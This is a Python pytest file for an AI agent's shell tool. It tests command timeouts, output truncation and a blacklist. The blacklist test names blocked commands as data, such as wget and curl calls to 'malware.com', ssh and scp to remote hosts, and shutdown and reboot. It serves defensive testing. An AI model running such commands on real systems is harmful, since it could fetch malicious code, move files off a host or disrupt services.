import pytest
import subprocess
import time
from unittest.mock import patch, Mock
from src.ai.tools import run_shell

def test_shell_timeout():
    """Test that long-running commands are terminated after the timeout."""
    
    with pytest.raises(subprocess.TimeoutExpired):
        # This simulates the subprocess raising the error
        raise subprocess.TimeoutExpired(cmd="sleep", timeout=1)
    
    # Real integration test with patching
    with patch("subprocess.run") as mock_run:
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep", timeout=30)
        result = run_shell("sleep 31")
        assert "Error: Command timed out after 30 seconds." in result

def test_shell_output_truncation():
    """Test that large outputs are truncated to the last 2000 characters."""
    # Generate a long string output
    long_str = "a" * 5000
    cmd = f"python -c \"print('{long_str}')\""
    
    # Since we can't easily inject a 5000 char string into the command line on all OSs safely without escaping issues,
    # let's mock the return value of subprocess.run to return a long string.
    
    with patch("subprocess.run") as mock_run:
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "a" * 3000 + "END"
        mock_result.stderr = ""
        mock_run.return_value = mock_result
        
        result = run_shell("some_command")
        
        assert len(result) <= 2100 # 2000 + prefix length + buffer
        assert "Truncated" in result
        assert result.endswith("END")
        assert result.startswith("STDOUT:\n\n... [Output Truncated]")

def test_shell_expanded_blacklist():
    """Test that new dangerous commands are blocked."""
    dangerous_commands = [
        "wget http://malware.com",
        "curl http://malware.com",
        "chmod 777 file",
        "chown user file",
        "ssh user@host",
        "scp file user@host:",
        "top",
        "htop",
        "nano file",
        "vim file",
        "vi file",
        "shutdown now",
        "reboot"
    ]
    
    for cmd in dangerous_commands:
        result = run_shell(cmd)
        assert "Command blocked" in result, f"Failed to block: {cmd}"
